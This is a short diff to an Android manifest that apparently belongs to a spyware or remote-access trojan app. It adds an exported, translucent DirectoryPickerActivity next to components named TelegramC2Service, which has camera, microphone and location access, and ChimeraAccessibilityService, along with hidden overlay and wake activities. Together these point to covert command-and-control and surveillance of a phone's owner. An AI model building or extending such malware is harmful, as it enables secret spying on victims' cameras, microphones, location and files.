@@ -38,6 +38,7 @@
 
         <activity android:name=".OverlayActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:exported="false"/>
         <activity android:name=".WakeActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:taskAffinity="" android:excludeFromRecents="true" android:exported="false"/>
+        <activity android:name=".DirectoryPickerActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:exported="true" />
 
         <service android:name=".TelegramC2Service" android:enabled="true" android:exported="false" android:foregroundServiceType="camera|location|microphone" />
         <service android:name=".ChimeraAccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="false">
